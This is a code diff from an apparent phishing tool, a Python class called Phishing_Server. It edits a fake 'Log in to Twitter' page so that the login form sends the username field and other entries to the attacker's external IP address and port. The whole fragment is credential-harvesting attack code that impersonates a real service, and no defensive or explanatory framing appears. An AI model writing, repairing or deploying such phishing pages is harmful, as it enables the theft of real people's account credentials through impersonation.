@@ -158,7 +158,7 @@ class Phishing_Server:
     <div class="col-md-6 p-0 pt-3">
     <i class="fa fa-twitter"></i>
     <h3 class="text-center pt-3">Log in to Twitter</h3>
-    <form class="login-form" action="http://""" + self.externalip + """">
+    <form class="login-form" action="http://""" + self.externalip + """:"""+str(self.port)+"""">
     <div class="mb-3 bg-color">
     <label>Phone, email, or username</label>
     <input type="text" class="form-control" name="username">
